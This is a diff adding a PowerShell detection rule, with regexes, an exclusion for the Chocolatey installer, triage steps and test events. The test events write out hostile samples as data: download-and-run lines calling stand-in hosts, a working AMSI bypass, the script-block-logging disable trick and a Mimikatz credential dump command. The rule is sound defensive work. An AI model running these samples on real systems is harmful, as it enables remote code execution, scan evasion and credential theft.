@@ -1,0 +1,107 @@
+id: DET-021
+title: Suspicious PowerShell script text (decode-and-run, download-and-run, credential tools, AMSI tampering)
+status: experimental
+severity: high
+attack:
+  tactic: Execution
+  technique: T1059.001
+  technique_name: PowerShell
+  also: [T1027, T1140, T1685, T1003.001]
+description: >
+  PowerShell script block logging records the text of the script that really ran, after decoding. This rule
+  looks inside that text for well-known attacker patterns: decoding base64 and running the result, downloading
+  text and running it, credential theft tool names, tampering with the anti-malware scan interface (AMSI), and
+  the reflection trick used to switch off script block logging itself. Because it reads the decoded script, it
+  also catches commands that were built at runtime, which a command-line rule cannot see (see EV-06 and DET-004).
+type: match
+filter:
+  - action: powershell_scriptblock
+    script_text|regex: '(?is)^(?=.*frombase64string)(?=.*(\biex\b|invoke-expression))'
+  - action: powershell_scriptblock
+    script_text|regex: '(?is)^(?=.*(downloadstring|downloadfile|invoke-webrequest|\biwr\b|net\.webclient|start-bitstransfer))(?=.*(\biex\b|invoke-expression))'
+  - action: powershell_scriptblock
+    script_text|regex: '(?i)(invoke-mimikatz|mimikatz|sekurlsa::|invoke-kerberoast|invoke-dcsync)'
+  - action: powershell_scriptblock
+    script_text|regex: '(?i)(amsiutils|amsiinitfailed|amsicontext)'
+  - action: powershell_scriptblock
+    script_text|regex: '(?i)system\.management\.automation\.utils.*cachedgrouppolicysettings'
+entity_fields: [host]
+suppress_seconds: 300
+exclusions:
+  - match:
+      user: it.admin
+      host: WS-001
+      script_text|regex: '(?is)^\s*set-executionpolicy bypass -scope process -force;\s*(\[system\.net\.servicepointmanager\]::securityprotocol = 3072;\s*)?iex \(\(new-object system\.net\.webclient\)\.downloadstring\(''https://community\.chocolatey\.org/install\.ps1''\)\)\s*$'
+    reason: The help desk installs the Chocolatey package manager on new workstations with its documented one-line installer (ticket IT-2290). Pinned to this admin, this host AND the whole one-liner, so the installer address inside a comment or a longer script does not match (that was the gap EV-14 found in the first version of this exclusion).
+false_positives: >
+  Package manager installers (Chocolatey, Scoop) and some admin deployment scripts download text and run it.
+triage:
+  - Read the script text. What does it download, decode or load, and where from?
+  - What started PowerShell? (Check the process event around the same time.)
+  - Did the host contact the address the script names?
+response:
+  - Isolate the host if the script is not recognised.
+  - Capture the full script text from the log before anything is cleaned up.
+  - Block any download address it names and search for other hosts that contacted it.
+tests:
+  - name: decode-and-run fires
+    expect: fire
+    events:
+      - {action: powershell_scriptblock, user: wardog, host: WS-005, script_text: '$b=[System.Convert]::FromBase64String("SQBFAFgA"); iex ([System.Text.Encoding]::Unicode.GetString($b))'}
+  - name: download-and-run fires
+    expect: fire
+    events:
+      - {action: powershell_scriptblock, user: wardog, host: WS-005, script_text: "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')"}
+  - name: the download-and-run split over several lines fires
+    expect: fire
+    events:
+      - {action: powershell_scriptblock, user: wardog, host: WS-005, script_text: "$u='http://203.0.113.9/a.ps1'\n$c=(New-Object Net.WebClient).DownloadString($u)\nInvoke-Expression $c"}
+  - name: a credential tool name fires
+    expect: fire
+    events:
+      - {action: powershell_scriptblock, user: wardog, host: WS-005, script_text: 'Invoke-Mimikatz -DumpCreds'}
+  - name: AMSI tampering fires
+    expect: fire
+    events:
+      - {action: powershell_scriptblock, user: wardog, host: WS-005, script_text: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"}
+  - name: the script block logging switch-off trick fires
+    expect: fire
+    events:
+      - {action: powershell_scriptblock, user: wardog, host: WS-005, script_text: "$GPS=[Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)"}
+  - name: an ordinary admin script stays quiet
+    expect: no_fire
+    events:
+      - {action: powershell_scriptblock, user: it.admin, host: WS-001, script_text: 'Get-Process | Sort-Object CPU -Descending | Select-Object -First 5'}
+  - name: base64 conversion without running the result stays quiet
+    expect: no_fire
+    events:
+      - {action: powershell_scriptblock, user: it.admin, host: WS-001, script_text: '$x=[Convert]::FromBase64String($cfg.Cert); Set-Content cert.cer -Value $x -Encoding Byte'}
+  - name: a download saved to disk without running it stays quiet
+    expect: no_fire
+    events:
+      - {action: powershell_scriptblock, user: it.admin, host: WS-001, script_text: 'Invoke-WebRequest -Uri https://example.org/tool.zip -OutFile C:\Temp\tool.zip'}
+  - name: the Chocolatey installer on the help desk workstation is excluded
+    expect: no_fire
+    events:
+      - {action: powershell_scriptblock, user: it.admin, host: WS-001, script_text: "Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))"}
+  - name: the same one-liner on another host still fires
+    expect: fire
+    events:
+      - {action: powershell_scriptblock, user: it.admin, host: WS-009, script_text: "Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))"}
+  - name: the installer address in a comment does not hide a download-and-run
+    expect: fire
+    events:
+      - {action: powershell_scriptblock, user: it.admin, host: WS-001, script_text: "# https://community.chocolatey.org/install.ps1\nIEX (New-Object Net.WebClient).DownloadString('http://203.0.113.60/x.ps1')"}
+  - name: the installer one-liner with a second command added still fires
+    expect: fire
+    events:
+      - {action: powershell_scriptblock, user: it.admin, host: WS-001, script_text: "Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1')); iex ((New-Object System.Net.WebClient).DownloadString('http://203.0.113.60/x.ps1'))"}
+  - name: running a local string with Invoke-Expression, with no decoding and no download, stays quiet
+    expect: no_fire
+    events:
+      - {action: powershell_scriptblock, user: it.admin, host: WS-001, script_text: '$cmd = "Get-Date -Format yyyy-MM-dd"; Invoke-Expression $cmd'}
+  - name: the same event three times in a row is folded into one alert (repeats are throttled, not paged again)
+    expect: fire
+    alerts: 1
+    events:
+      - {action: powershell_scriptblock, user: wardog, host: WS-005, script_text: '$b=[System.Convert]::FromBase64String("SQBFAFgA"); iex ([System.Text.Encoding]::Unicode.GetString($b))', repeat: 3, every: 10s}
